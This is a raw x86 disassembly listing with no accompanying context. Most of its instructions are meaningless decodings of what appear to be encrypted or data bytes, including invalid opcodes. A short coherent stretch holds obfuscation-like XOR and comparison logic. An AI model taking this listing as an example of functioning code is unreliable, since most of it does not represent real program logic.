  41c280:	out    0x5e,eax
  41c282:	xchg   ecx,eax
  41c283:	sub    cl,al
  41c285:	scas   eax,DWORD PTR es:[edi]
  41c286:	ins    BYTE PTR es:[edi],dx
  41c287:	ja     0x41c297
  41c289:	out    0x29,eax
  41c28b:	jl     0x41c233
  41c28d:	jecxz  0x41c2a8
  41c28f:	ins    DWORD PTR es:[edi],dx
  41c290:	xchg   ebx,eax
  41c291:	aas    
  41c292:	fidiv  DWORD PTR [edi+0x3d]
  41c295:	lods   al,BYTE PTR ds:[esi]
  41c296:	mov    ds:0xfbe414ca,al
  41c29b:	mov    bl,0xfd
  41c29d:	clc    
  41c29e:	enter  0x2d10,0x1
  41c2a2:	(bad)  
  41c2a3:	xchg   edi,eax
  41c2a4:	shl    BYTE PTR [ebx-0x4618f20f],1
  41c2aa:	test   BYTE PTR [ebx+0x64],ah
  41c2ad:	mov    edx,0x1b9cb450
  41c2b2:	dec    DWORD PTR [ebx+0x64c71ba0]
  41c2b8:	lahf   
  41c2b9:	pop    eax
  41c2ba:	data16 fnstsw WORD PTR [edi]
  41c2bd:	out    dx,eax
  41c2be:	cmp    esi,eax
  41c2c0:	imul   ebx,DWORD PTR [ebp-0x5cbad5e1],0xd8c1a0db
  41c2ca:	cli    
  41c2cb:	or     bl,BYTE PTR [edx]
  41c2cd:	nop
  41c2ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c2cf:	ds ds out dx,al
  41c2d2:	popa   
  41c2d3:	add    bl,dh
  41c2d5:	not    bh
  41c2d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c2d8:	lea    ecx,[ebp+0x35]
  41c2db:	adc    DWORD PTR [eax],eax
  41c2dd:	fs mov ebx,0xc7ecc200
  41c2e4:	or     DWORD PTR [eax+esi*8],ecx
  41c2e7:	loop   0x41c328
  41c2e9:	sbb    al,0x4d
  41c2eb:	cmp    esp,DWORD PTR [edi]
  41c2ed:	dec    esi
  41c2ee:	fdivp  st(6),st
  41c2f0:	sub    eax,0xabd2f7d1
  41c2f5:	or     BYTE PTR [ecx+0x2383e36c],cl
  41c2fb:	js     0x41c2a4
  41c2fd:	and    al,0xd3
  41c2ff:	call   FWORD PTR [esp+ebx*4]
  41c302:	mov    dh,0x97
  41c304:	xchg   edx,eax
  41c305:	loope  0x41c306
  41c307:	lea    edi,[ecx+ecx*1+0x42]
  41c30b:	(bad)
  41c30f:	sar    ch,1
  41c311:	dec    esp
  41c312:	nop
  41c313:	aam    0x2f
  41c315:	loope  0x41c356
  41c317:	(bad)  
  41c318:	jg     0x41c360
  41c31a:	cld    
  41c31b:	pop    esp
  41c31c:	stc    
  41c31d:	mov    al,ds:0xfa9aa143
  41c322:	(bad)  
  41c323:	fwait
  41c324:	jmp    0xd53d:0x6d67e418
  41c32b:	out    dx,eax
  41c32c:	dec    esp
  41c32d:	daa    
  41c32e:	cmp    DWORD PTR [ecx],ebx
  41c330:	add    DWORD PTR [ecx+0x7e281ed5],0xffffff9c
  41c337:	push   esp
  41c338:	or     ecx,ecx
  41c33a:	(bad)  
  41c33b:	stos   BYTE PTR es:[edi],al
  41c33c:	inc    ebx
  41c33d:	stc    
  41c33e:	jns    0x41c30e
  41c340:	cli    
  41c341:	cmp    edx,DWORD PTR [ecx+0x1d]
  41c344:	rcl    BYTE PTR [ecx-0x2a],1
  41c347:	jno    0x41c33c
  41c349:	jns    0x41c36b
  41c34b:	dec    edi
  41c34c:	or     bl,BYTE PTR [ecx+0x3aedd850]
  41c352:	dec    esp
  41c353:	dec    eax
  41c354:	pop    ds
  41c355:	imul   ebp,DWORD PTR [eax-0x32ea63e3],0xb1ec921c
  41c35f:	or     ah,BYTE PTR ds:0xd793f9b6
  41c365:	push   esp
  41c366:	bound  ecx,QWORD PTR [edx+0x2c]
  41c369:	sub    edi,DWORD PTR [edx*1-0x3582293f]
  41c370:	or     BYTE PTR [ecx-0x3a],0x6b
  41c374:	jg     0x41c3d5
  41c376:	dec    al
  41c378:	inc    eax
  41c379:	lock dec ebx
  41c37b:	ficomp WORD PTR [ecx+0x21]
  41c37e:	popa   
  41c37f:	(bad)  
  41c380:	repz cmp DWORD PTR [esi+0x2],ebx
  41c384:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41c386:	ins    DWORD PTR es:[edi],dx
  41c387:	repnz clc 
  41c389:	ss jg  0x41c316
  41c38c:	pop    esi
  41c38d:	inc    esi
  41c38e:	fidivr WORD PTR [ebp+0x44]
  41c391:	inc    eax
  41c392:	fs retf 
  41c394:	sbb    ch,ch
  41c396:	inc    edx
  41c397:	jo     0x41c390
  41c399:	fild   QWORD PTR [edi]
  41c39b:	sub    eax,0x711705cc
  41c3a0:	leave  
  41c3a1:	and    al,0xb4
  41c3a3:	(bad)  
  41c3a4:	dec    ebp
  41c3a5:	es ins DWORD PTR es:[edi],dx
  41c3a7:	dec    esp
  41c3a8:	or     ah,BYTE PTR [ecx]
  41c3aa:	in     eax,dx
  41c3ab:	mov    eax,0xdeff4f6
  41c3b0:	push   ss
  41c3b1:	dec    ebx
  41c3b2:	sbb    BYTE PTR [edi+0x5c99a596],dl
  41c3b8:	mov    ?,ebx
  41c3ba:	cmp    edx,DWORD PTR [esi+0x52]
  41c3bd:	xchg   ebp,eax
  41c3be:	adc    al,0xc2
  41c3c0:	jge    0x41c413
  41c3c2:	mov    DWORD PTR [edi],edi
  41c3c4:	adc    al,0x99
  41c3c6:	push   ebx
  41c3c7:	dec    edi
  41c3c8:	pop    es
  41c3c9:	test   al,0x95
  41c3cb:	shl    ebp,0xf0
  41c3ce:	add    ecx,esi
  41c3d0:	jmp    0xabf6:0xc54645f4
  41c3d7:	fdiv   st(4),st
  41c3d9:	mov    ebx,0x957ba393
  41c3de:	dec    ebp
  41c3df:	fnsave [edx+0x1b6d58fa]
  41c3e5:	out    dx,eax
  41c3e6:	xor    BYTE PTR ds:0x831eab3b,cl
  41c3ec:	xor    DWORD PTR [ebp+0x32a63f39],edi
  41c3f2:	out    0xbe,al
  41c3f4:	xchg   esi,eax
  41c3f5:	mov    BYTE PTR [ebx+0x49558e6e],bh
  41c3fb:	test   al,0xab
  41c3fd:	jg     0x41c40a
  41c3ff:	mov    edi,0xd37700ea
  41c404:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c405:	inc    ebx
  41c406:	fld    TBYTE PTR fs:[edi+0xf]
  41c40a:	cmp    al,0x5d
  41c40c:	dec    DWORD PTR [edx]
  41c40e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c40f:	and    DWORD PTR [esi-0x7d39a15c],0xda377a79
  41c419:	jp     0x41c44d
  41c41b:	inc    edx
  41c41c:	loop   0x41c409
  41c41e:	sti    
  41c41f:	sub    al,0x75
  41c421:	bound  ebx,QWORD PTR [ecx+0x60691345]
  41c427:	sti    
  41c428:	bound  edi,QWORD PTR [esi]
  41c42a:	jbe    0x41c423
  41c42c:	test   ch,cl
  41c42e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c42f:	gs pop esp
  41c431:	mov    al,0xd
  41c434:	repz mov ah,cl
  41c437:	adc    dh,ah
  41c439:	push   es
  41c43a:	lods   eax,DWORD PTR ds:[esi]
  41c43b:	repz and ah,BYTE PTR [ebp-0x46b37d11]
  41c442:	xchg   edi,eax
  41c443:	ds pop edi
  41c445:	in     al,0x8c
  41c447:	or     al,0x87
  41c449:	pusha  
  41c44a:	cmc    
  41c44b:	mov    cl,0x46
  41c44d:	shl    BYTE PTR [edx+0x63c12e74],1
  41c453:	les    eax,FWORD PTR [ebp+0x2a24270b]
  41c459:	pop    ebx
  41c45a:	adc    ch,BYTE PTR [eax-0x30]
  41c45d:	jge    0x41c488
  41c45f:	dec    edi
  41c460:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c461:	fwait
  41c462:	mov    ah,0x63
  41c464:	cmp    dl,bh
  41c466:	mov    cl,0x7b
  41c468:	fisub  WORD PTR [ebx+edi*1]
  41c46b:	xlat   BYTE PTR ds:[ebx]
  41c46c:	ret    
  41c46d:	sbb    al,BYTE PTR [ebx]
  41c46f:	or     al,0x8e
  41c471:	push   es
  41c472:	rcl    bh,0x29
  41c475:	nop
  41c476:	call   0xe8ec:0x8819db62
  41c47d:	jle    0x41c484
  41c47f:	cmc    
  41c480:	test   DWORD PTR [edi+ecx*1-0x59],ecx
  41c484:	push   ss
  41c485:	out    0xd4,eax
  41c487:	popf   
  41c488:	xchg   edx,eax
  41c489:	pop    esi
  41c48a:	pop    esp
  41c48b:	push   eax
  41c48c:	or     bh,0xfe
  41c48f:	jl     0x41c463
  41c491:	fisubr WORD PTR [eax-0x7100469c]
  41c497:	cmp    edx,edi
  41c499:	imul   ecx,DWORD PTR [esi-0x4f5a02c7],0x5b
  41c4a0:	addr16 sub eax,0x4d9e02fc
  41c4a6:	dec    ebp
  41c4a7:	push   edx
  41c4a8:	push   eax
  41c4a9:	rol    BYTE PTR [eax-0x71],cl
  41c4ac:	cmp    eax,DWORD PTR [esi+ebx*4+0x7a0fb0d5]
  41c4b3:	jle    0x41c49d
  41c4b5:	sbb    al,0x89
  41c4b7:	(bad)  
  41c4b8:	(bad)  
  41c4b9:	jmp    0x41c888
  41c4be:	inc    edi
  41c4bf:	and    edi,DWORD PTR [eax]
  41c4c1:	sbb    DWORD PTR [ebx+eax*1],esi
  41c4c4:	daa    
  41c4c5:	and    cl,BYTE PTR [ebx]
  41c4c7:	cdq    
  41c4c8:	lahf   
  41c4c9:	jo     0x41c484
  41c4cb:	pop    esp
  41c4cc:	cmp    edi,DWORD PTR [esi+0x1816734a]
  41c4d2:	mov    esp,0x41181812
  41c4d7:	dec    esp
  41c4d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4d9:	idiv   BYTE PTR [ebp+0x49]
  41c4dc:	mov    eax,0x91b18771
  41c4e1:	lods   eax,DWORD PTR ds:[esi]
  41c4e2:	js     0x41c4b7
  41c4e4:	ss cmc 
  41c4e6:	adc    cl,ch
  41c4e8:	cmp    BYTE PTR [edx],0xa8
  41c4eb:	sub    al,0x70
  41c4ed:	jne    0x41c493
  41c4ef:	push   ebx
  41c4f0:	mov    edx,0x29300c96
  41c4f5:	sti    
  41c4f6:	aam    0x79
  41c4f8:	add    ebx,eax
  41c4fa:	push   ebx
  41c4fb:	lea    ebp,[eax+0x47]
  41c4fe:	js     0x41c546
  41c500:	out    dx,al
  41c501:	aam    0x4c
  41c503:	aaa    
  41c504:	test   BYTE PTR [esp+ebx*2-0x7b],0x14
  41c509:	push   esp
  41c50a:	jnp    0x41c55f
  41c50c:	lds    esi,FWORD PTR [edi]
  41c50e:	and    al,cl
  41c510:	push   esi
  41c511:	mov    esi,0x9262c0e6
  41c516:	jp     0x41c51d
  41c518:	push   cs
  41c519:	out    dx,eax
  41c51a:	pcmpgtd mm5,QWORD PTR [edx-0x72]
  41c51e:	inc    ecx
  41c51f:	mov    bl,0x68
  41c521:	jge    0x41c4c3
  41c523:	add    eax,0x8d1747a0
  41c528:	push   ebx
  41c529:	mov    edi,DWORD PTR [edx-0x5f]
  41c52c:	repz in al,0xe4
  41c52f:	jb     0x41c55f
  41c531:	inc    edi
  41c533:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c534:	dec    eax
  41c535:	jg     0x41c56e
  41c537:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c538:	aam    0x5c
  41c53a:	imul   ebx,edi,0xffffffcd
  41c53d:	inc    esi
  41c53e:	jmp    0x41c4e7
  41c540:	pop    eax
  41c541:	shl    DWORD PTR [esi],0x96
  41c544:	cmp    BYTE PTR [ebx+eax*4-0x3e],bh
  41c548:	arpl   WORD PTR [ebx+0x49f961f5],cx
  41c54e:	retf   0x8e8f
  41c551:	mov    dl,0x74
  41c553:	sbb    ebx,esp
  41c555:	frstor [edx]
  41c557:	sub    al,BYTE PTR [edi-0x4bc2be87]
  41c55d:	scas   eax,DWORD PTR es:[edi]
  41c55e:	xor    esp,DWORD PTR [esi]
  41c560:	dec    edi
  41c561:	shl    dh,cl
  41c563:	sbb    DWORD PTR [ebx+0x3ba28308],ebx
  41c569:	daa    
  41c56a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c56b:	int3   
  41c56c:	and    DWORD PTR [eax-0x13],ebp
  41c56f:	adc    eax,0xe0c920d4
  41c574:	sub    bl,BYTE PTR ds:0x4408fbd
  41c57a:	push   edx
  41c57b:	not    DWORD PTR [edi]
  41c57d:	sbb    DWORD PTR [edx],edi
  41c57f:	add    al,BYTE PTR [edx+edx*8-0x56c3786]
  41c586:	lock cmp dl,BYTE PTR [esi]
  41c589:	dec    edx
  41c58a:	mov    ch,0xe2
  41c58c:	mov    bh,0xea
  41c58e:	pushf  
  41c58f:	lock xor DWORD PTR [ecx+0x44],edi
  41c593:	xor    dh,ch
  41c595:	jnp    0x41c518
  41c597:	jnp    0x41c585
  41c599:	lahf   
  41c59a:	sub    eax,0x36d996f2
  41c59f:	mov    bl,0x45
  41c5a1:	(bad)  
  41c5a2:	ja     0x41c5a4
  41c5a4:	int    0x3d
  41c5a6:	mov    eax,0x439ae338
  41c5ab:	mov    ebp,0xa9245244
  41c5b0:	jge    0x41c594
  41c5b2:	mov    cl,0x3
  41c5b4:	and    ecx,eax
  41c5b6:	ins    BYTE PTR es:[edi],dx
  41c5b7:	or     BYTE PTR ds:0xd64ab5b,0x1
  41c5be:	mov    ss,WORD PTR [eax+0x3d8003b9]
  41c5c4:	add    eax,0x4ab6ada3
  41c5c9:	adc    bl,BYTE PTR [esi-0x3f4d5e43]
  41c5cf:	ds inc ecx
  41c5d1:	pop    ss
  41c5d2:	push   eax
  41c5d3:	sub    ch,BYTE PTR [ebx]
  41c5d5:	out    0xd9,eax
  41c5d7:	cmp    eax,0x19635eea
  41c5dc:	imul   ecx,edi,0x58
  41c5df:	into   
  41c5e0:	mov    bl,0x1e
  41c5e2:	inc    ebx
  41c5e3:	outs   dx,BYTE PTR ds:[esi]
  41c5e4:	cli    
  41c5e5:	dec    eax
  41c5e6:	add    esi,DWORD PTR [ebx-0x7e]
  41c5e9:	lods   eax,DWORD PTR ds:[esi]
  41c5ea:	jae    0x41c591
  41c5ec:	mov    al,ds:0x348668b7
  41c5f1:	sub    al,0x74
  41c5f3:	imul   eax,eax,0x5357eddd
  41c5f9:	arpl   WORD PTR [ebx+0x2d87e475],ax
  41c5ff:	jl     0x41c673
  41c601:	mov    cl,0x27
  41c603:	mov    dh,0x45
  41c605:	rcr    DWORD PTR [ebp+0x24b95714],cl
  41c60b:	loop   0x41c59c
  41c60d:	and    dl,BYTE PTR [ebp-0x5a]
  41c610:	adc    ebx,edx
  41c612:	push   cs
  41c613:	pop    es
  41c614:	out    dx,eax
  41c615:	pop    DWORD PTR [edi-0x35b77b77]
  41c61b:	jb     0x41c642
  41c61d:	mov    eax,0xd1caf799
  41c622:	adc    al,BYTE PTR [ecx-0x15]
  41c625:	call   0x9806:0xf4ef4fc1
  41c62c:	arpl   WORD PTR [edi+0x58],bp
  41c62f:	mov    ecx,0x9d947167
  41c634:	dec    edi
  41c635:	push   esp
  41c636:	clc    
  41c637:	mov    ds:0xef07ee28,eax
  41c63c:	push   edi
  41c63d:	(bad)  
  41c63e:	sar    BYTE PTR [ebx],1
  41c640:	dec    eax
  41c641:	je     0x41c64c
  41c643:	enter  0xfa04,0xcc
  41c647:	int3   
  41c648:	test   cl,dl
  41c64a:	ja     0x41c62e
  41c64c:	repz jecxz 0x41c5f2
  41c64f:	sbb    esi,esp
  41c651:	add    al,0x87
  41c653:	dec    edx
  41c654:	cli    
  41c655:	test   eax,0xd8991ee4
  41c65a:	loop   0x41c5f3
  41c65c:	push   ebx
  41c65d:	jmp    DWORD PTR [edx]
  41c65f:	dec    edx
  41c660:	sbb    al,0xe7
  41c662:	leave  
  41c663:	daa    
  41c664:	call   0x3afb:0xf11e9fc9
  41c66b:	pop    ds
  41c66c:	(bad)  
  41c66d:	mov    ebx,esp
  41c66f:	xor    ch,bh
  41c671:	adc    edi,ebp
  41c673:	cwde   
  41c674:	jle    0x41c69b
  41c676:	dec    edx
  41c677:	dec    ebx
  41c678:	mov    esi,0xafdc2eff
  41c67d:	sub    BYTE PTR [edi+0x58039853],dl
  41c683:	mov    ah,0x8
  41c685:	xor    ah,dl
  41c687:	stos   BYTE PTR es:[edi],al
  41c688:	adc    DWORD PTR [ecx],edi
  41c68a:	mov    eax,ds:0x473a5337
  41c68f:	lds    edx,FWORD PTR [edx]
  41c691:	call   0xe30d:0x33da541f
  41c698:	jbe    0x41c66f
  41c69a:	aam    0x2b
  41c69c:	inc    esi
  41c69d:	scas   al,BYTE PTR es:[edi]
  41c69e:	sub    cl,ch
  41c6a0:	int3   
  41c6a1:	dec    edx
  41c6a2:	jecxz  0x41c67f
  41c6a4:	pop    esi
  41c6a5:	mov    bh,0xf7
  41c6a7:	pop    es
  41c6a8:	push   bx
  41c6aa:	out    0x7d,al
  41c6ac:	(bad)
  41c6af:	jo     0x41c70d
  41c6b1:	adc    ah,BYTE PTR ds:0x36606c05
  41c6b7:	push   edx
  41c6b8:	inc    ebp
  41c6ba:	pop    ds
  41c6bb:	ins    DWORD PTR es:[edi],dx
  41c6bc:	pop    esp
  41c6bd:	sar    esp,0xf2
  41c6c0:	pushf  
  41c6c1:	sub    dh,ch
  41c6c3:	in     eax,0xd6
  41c6c5:	push   ds
  41c6c6:	xor    eax,0xa7498d23
  41c6cb:	sub    ch,BYTE PTR [ebp+esi*8-0x37]
  41c6cf:	shr    eax,0xe8
  41c6d2:	add    al,0x7b
  41c6d4:	sbb    BYTE PTR [eiz*8+0x7abd750e],dl
  41c6db:	mov    eax,0xe844300c
  41c6e0:	daa    
  41c6e1:	xchg   ecx,eax
  41c6e2:	scas   al,BYTE PTR es:[edi]
  41c6e3:	pop    ebp
  41c6e4:	inc    edx
  41c6e5:	cmp    dh,cl
  41c6e7:	mov    esp,ecx
  41c6e9:	xchg   edi,esp
  41c6eb:	rol    DWORD PTR [eiz*1-0x24d372f9],0x2a
  41c6f3:	mov    ds:0x9e56df10,eax
  41c6f8:	popf   
  41c6f9:	(bad)  
  41c6fa:	jno    0x41c771
  41c6fc:	inc    ecx
  41c6fd:	pop    eax
  41c6fe:	aam    0x3a
  41c700:	stc    
  41c701:	and    al,0xba
  41c703:	or     esi,DWORD PTR [eax]
  41c705:	or     bh,BYTE PTR [edx]
  41c707:	rcl    dh,1
  41c709:	sbb    BYTE PTR [eax+0x4],0xa6
  41c70d:	mov    WORD PTR [edi+0x16],es
  41c710:	hlt    
  41c711:	pop    esi
  41c712:	push   eax
  41c713:	gs repnz leave 
  41c716:	push   esp
  41c717:	xor    al,0x38
  41c719:	or     eax,0x2e16bd89
  41c71e:	mov    ebp,0x71c2720d
  41c723:	rcr    BYTE PTR [ebp-0x1d],1
  41c726:	add    bh,BYTE PTR [ecx]
  41c728:	fisttp DWORD PTR [ebx]
  41c72a:	sub    BYTE PTR [edi],al
  41c72c:	xchg   esi,eax
  41c72d:	lds    edi,FWORD PTR [esi-0x3a]
  41c730:	scas   al,BYTE PTR es:[edi]
  41c731:	iret   
  41c732:	push   edi
  41c733:	mov    esp,0xc8d5d096
  41c738:	std    
  41c739:	jae    0x41c7a4
  41c73b:	pop    edx
  41c73c:	dec    ecx
  41c73d:	add    eax,0x737e42a3
  41c742:	add    al,0x38
  41c744:	or     esp,DWORD PTR [esi+0x6c]
  41c747:	inc    ecx
  41c748:	retf   
  41c749:	fist   DWORD PTR [edx+0x9]
  41c74c:	mov    esp,0x3da4f39f
  41c751:	std    
  41c752:	mov    edx,0xe6d34381
  41c757:	cmp    cl,BYTE PTR [ebx+0x8]
  41c75a:	(bad)  
  41c75b:	mov    eax,ds:0xcd138468
  41c760:	shr    BYTE PTR [ebp-0x5c],0x9a
  41c764:	sub    BYTE PTR [edi],cl
  41c766:	test   eax,0xcbcf8e02
  41c76b:	add    DWORD PTR [esi+0x7daf8855],0xec7f10a2
  41c775:	add    BYTE PTR [ecx],al
  41c777:	and    eax,0xc4b07ae4
  41c77c:	icebp  
  41c77d:	out    0xa3,eax
  41c77f:	xor    al,0x45
  41c781:	and    eax,0x7c0096fe
  41c786:	call   0x2392f8b9
  41c78b:	js     0x544792b9
  41c791:	daa    
  41c792:	xchg   edx,eax
  41c793:	ins    DWORD PTR es:[edi],dx
  41c794:	(bad)  
  41c795:	ins    BYTE PTR es:[edi],dx
  41c796:	cmc    
  41c797:	push   es
  41c798:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c799:	fcmovu st,st(4)
  41c79b:	xor    DWORD PTR [ebx+0x32fa2170],eax
  41c7a1:	js     0x41c774
  41c7a3:	push   es
  41c7a4:	ins    BYTE PTR es:[edi],dx
  41c7a5:	ja     0x41c7f2
  41c7a7:	jge    0x41c783
  41c7a9:	lock push ss
  41c7ab:	icebp  
  41c7ac:	fistp  DWORD PTR [ecx]
  41c7ae:	inc    eax
  41c7af:	sti    
  41c7b0:	fsub   DWORD PTR [ebx+0xe]
  41c7b3:	stc    
  41c7b4:	xchg   esp,eax
  41c7b5:	fwait
  41c7b6:	cwde   
  41c7b7:	mov    bh,0x7b
  41c7b9:	(bad)  
  41c7ba:	pop    edx
  41c7bb:	xlat   BYTE PTR ds:[ebx]
  41c7bc:	mov    cl,0x92
  41c7be:	lods   eax,DWORD PTR ds:[esi]
  41c7bf:	bound  ebp,QWORD PTR [ebp-0x3f5f4fbe]
  41c7c5:	outs   dx,BYTE PTR ds:[esi]
  41c7c6:	or     al,ch
  41c7c8:	add    eax,0xab9c543a
  41c7cd:	jp     0x41c80b
  41c7cf:	cmp    dh,BYTE PTR [ebp+esi*2-0x6]
  41c7d3:	mov    eax,ds:0x10446066
  41c7d8:	mov    ecx,DWORD PTR [edi]
  41c7da:	and    al,0x28
  41c7dc:	jp     0x41c7aa
  41c7de:	(bad)  
  41c7df:	fimul  DWORD PTR [ecx-0x42c943d3]
  41c7e5:	cmc    
  41c7e6:	xchg   esp,eax
  41c7e7:	xchg   esi,eax
  41c7e8:	adc    bh,BYTE PTR [ebp+0xf]
  41c7eb:	push   ebx
  41c7ec:	lods   al,BYTE PTR ds:[esi]
  41c7ed:	hlt    
  41c7ee:	or     DWORD PTR [esi],ecx
  41c7f0:	shr    DWORD PTR [edi],1
  41c7f2:	scas   eax,DWORD PTR es:[edi]
  41c7f3:	sub    al,0x35
  41c7f5:	dec    ecx
  41c7f6:	xor    al,0xef
  41c7f8:	mov    DWORD PTR [edi-0x7fcc07e1],edi
  41c7fe:	imul   esi,DWORD PTR [edi+0x68414f8f],0x1d37a166
  41c808:	mov    WORD PTR [esi+0x7c],ss
  41c80b:	push   esi
  41c80c:	popa   
  41c80d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c80e:	icebp  
  41c80f:	inc    esp
  41c810:	cwde   
  41c811:	ja     0x41c873
  41c813:	outs   dx,BYTE PTR ds:[esi]
  41c814:	cmp    esp,DWORD PTR [esi-0x243c74cd]
  41c81a:	adc    BYTE PTR [ecx+0x602cf009],0x41
  41c821:	dec    DWORD PTR [esi+0x32]
  41c824:	dec    eax
  41c825:	cwde   
  41c826:	sbb    eax,0xdb3dcde8
  41c82b:	je     0x41c847
  41c82d:	jmp    0xdeed:0x803acff
  41c834:	push   ebx
  41c835:	adc    esi,esp
  41c837:	inc    eax
  41c838:	cli    
  41c839:	jl     0x41c7f7
  41c83b:	loope  0x41c8b0
  41c83d:	in     eax,0x3f
  41c83f:	mov    cl,BYTE PTR [edx+edi*2]
  41c842:	adc    ah,BYTE PTR [edx]
  41c844:	jecxz  0x41c7f4
  41c846:	mov    WORD PTR [eax],fs
  41c848:	jmp    0x69c1:0xd1d4a256
  41c84f:	loope  0x41c7db
  41c851:	pop    es
  41c852:	ret    
  41c853:	lea    eax,[esi+0x41]
  41c856:	sbb    al,0x77
  41c858:	push   0x143c5319
  41c85d:	adc    bh,BYTE PTR [ebx-0x3]
  41c860:	cmp    bh,bh
  41c862:	push   cs
  41c863:	adc    DWORD PTR [edx-0x3a6fce66],eax
  41c869:	aam    0xd7
  41c86b:	xchg   esp,eax
  41c86c:	push   ss
  41c86d:	js     0x41c876
  41c86f:	pop    ecx
  41c870:	xchg   esp,eax
  41c871:	xchg   ebp,esp
  41c873:	dec    ecx
  41c874:	adc    al,0x7b
  41c876:	loopne 0x41c8d1
  41c878:	and    DWORD PTR [edx],esp
  41c87a:	jns    0x41c894
  41c87c:	xor    eax,0x79d8f2a8
  41c881:	cmp    BYTE PTR [edi],0x0
  41c884:	idiv   al
  41c886:	pop    fs
  41c888:	push   DWORD PTR [esp+0x74]
  41c88c:	push   DWORD PTR [esp+0x74]
  41c890:	push   DWORD PTR [esp+0x24]
  41c894:	push   DWORD PTR [esp+0x24]
  41c898:	call   0x415a06
  41c89d:	mov    edx,DWORD PTR [esp+0x18]
  41c8a1:	mov    eax,DWORD PTR [esp+0x1c]
  41c8a5:	mov    ecx,DWORD PTR [esp+0x18]
  41c8a9:	mov    edi,DWORD PTR [esp+0x1c]
  41c8ad:	shrd   edx,eax,0x2
  41c8b1:	shr    eax,0x2
  41c8b4:	shl    ecx,0x1e
  41c8b7:	xor    ecx,ecx
  41c8b9:	mov    eax,0x329e695d
  41c8be:	xor    edx,eax
  41c8c0:	or     ecx,edx
  41c8c2:	mov    edx,DWORD PTR [esp+0x5c]
  41c8c6:	mov    DWORD PTR [edx],ecx
  41c8c8:	mov    ecx,DWORD PTR [esp+0x18]
  41c8cc:	mov    edx,DWORD PTR [esp+0x1c]
  41c8d0:	shrd   ecx,edx,0x2
  41c8d4:	xor    ecx,eax
  41c8d6:	mov    eax,DWORD PTR [esp+0x18]
  41c8da:	shl    eax,0x1e
  41c8dd:	shr    edx,0x2
  41c8e0:	mov    edx,DWORD PTR [esp+0x1c]
  41c8e4:	xor    eax,eax
  41c8e6:	or     eax,ecx
  41c8e8:	mov    ecx,DWORD PTR [esp+0x68]
  41c8ec:	mov    DWORD PTR [ecx],eax
  41c8ee:	mov    eax,DWORD PTR [esp+0x68]
  41c8f2:	mov    ecx,DWORD PTR [esp+0x68]
  41c8f6:	mov    eax,DWORD PTR [eax]
  41c8f8:	cmp    eax,DWORD PTR [ecx]
  41c8fa:	jne    0x41d531
  41c900:	mov    eax,DWORD PTR [esp+0x5c]
  41c904:	mov    ecx,DWORD PTR [esp+0x5c]
  41c908:	mov    eax,DWORD PTR [eax]
  41c90a:	cmp    eax,DWORD PTR [ecx]
  41c90c:	jne    0x41d531
  41c912:	mov    BYTE PTR [esp+0x2c],0x20
  41c917:	mov    BYTE PTR [esp+0x38],0x3
  41c91c:	mov    BYTE PTR [esp+0x3c],0x6d
  41c921:	mov    BYTE PTR [esp+0x2b],0x90
  41c926:	mov    al,BYTE PTR [esp+0x2b]
  41c92a:	jmp    0x41ccf9
  41c92f:	push   ebp
  41c930:	and    al,0x97
  41c932:	shl    DWORD PTR [esi-0x5e],cl
  41c935:	push   ebp
  41c936:	and    dh,ch
  41c938:	jmp    DWORD PTR [ebx-0x44]
  41c93b:	sbb    DWORD PTR ds:0x6befbca5,edx
  41c941:	push   ss
  41c942:	sbb    BYTE PTR [edx+edx*1-0xe3fe7e8],bh
  41c949:	inc    eax
  41c94a:	loope  0x41c93c
  41c94c:	jb     0x41c8ea
  41c94e:	push   es
  41c94f:	int3   
  41c950:	pop    ebp
  41c951:	ins    BYTE PTR es:[edi],dx
  41c952:	push   ebp
  41c953:	mov    ch,0xb7
  41c955:	xchg   esi,eax
  41c956:	in     eax,dx
  41c957:	adc    ecx,DWORD PTR [edi+0x7]
  41c95a:	cdq    
  41c95b:	dec    eax
  41c95c:	out    0xfe,eax
  41c95e:	pop    ebp
  41c95f:	mov    eax,0x8d51cc5d
  41c964:	fidivr DWORD PTR [ebp+0x17772dce]
  41c96a:	jl     0x41c98b
  41c96c:	test   ch,al
  41c96e:	stos   BYTE PTR es:[edi],al
  41c96f:	and    BYTE PTR [ecx+0x68f7a73c],ch
  41c975:	push   esp
  41c976:	loope  0x41c990
  41c978:	inc    eax
  41c979:	out    dx,eax
  41c97a:	push   ecx
  41c97b:	clc    
  41c97c:	fidiv  DWORD PTR ds:0x825b18f
  41c982:	jle    0x41c99e
  41c984:	mov    ecx,0xc417b01c
  41c989:	into   
  41c98a:	mov    eax,0x30c8ab5a
  41c98f:	adc    eax,0x9d3041f
  41c994:	ss xor al,0xd7
  41c997:	xor    DWORD PTR [edx-0x1f25b00b],esp
  41c99d:	in     al,dx
  41c99e:	dec    esi
  41c99f:	repz push 0x190fa856
  41c9a5:	pop    ecx
  41c9a6:	inc    edi
  41c9a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9a8:	popa   
  41c9a9:	jne    0x41c981
  41c9ab:	sub    BYTE PTR [ecx+0x5b],dh
  41c9ae:	cmp    eax,0x13ecc3fa
  41c9b3:	dec    esp
  41c9b4:	cmc    
  41c9b5:	inc    ebx
  41c9b6:	into   
  41c9b7:	jg     0x41c93c
  41c9b9:	mov    ds:0x3c192c36,eax
  41c9be:	cdq    
  41c9bf:	or     eax,0x73d2cdd7
  41c9c4:	js     0x41c9d3
  41c9c6:	mov    ds:0x90ac5950,al
  41c9cb:	cmp    DWORD PTR [ecx],edi
  41c9cd:	cmp    eax,0x2e161245
  41c9d2:	sbb    DWORD PTR [eax+eiz*4-0xc],ebx
  41c9d6:	inc    esp
  41c9d7:	adc    al,0xfe
  41c9d9:	mov    ebx,0xb2a3a2a6
  41c9de:	test   BYTE PTR [edx+0xe],al
